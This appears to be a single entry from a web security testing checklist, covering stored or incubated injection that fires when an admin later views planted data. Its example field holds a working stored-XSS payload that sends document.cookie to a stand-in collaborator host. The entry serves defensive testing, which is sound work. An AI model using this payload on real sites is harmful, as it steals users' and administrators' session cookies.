- id: WEB-INJ-016
  sheet: WEB
  category: INJ
  title: Test for incubated vulnerabilities that need a recall step
  objective: Finds stored injection that only triggers when a later action recalls the planted data.
  preconditions:
  - Do not run on production.
  steps:
  - Identify features that store attacker data for later use, such as uploads, forum posts or report generation.
  - Plant a stored XSS or SQL payload that fires on a later recall, such as an admin viewing a report.
  - Trigger or wait for the recall step and confirm the planted payload executes.
  example: 'Bulletin post: <script>document.write(''<img src="https://collaborator-host/cv.jpg?''+document.cookie+''">'')</script> then wait for an admin to view the post'
  expected: Stored input is sanitized at write time and encoded at every later recall point, so the planted payload never executes.
  severity: High
  test_type: Manual
  refs:
    wstg:
    - WSTG-INJT-14
    cwe:
    - CWE-79
    capec:
    - CAPEC-592
  sources_read:
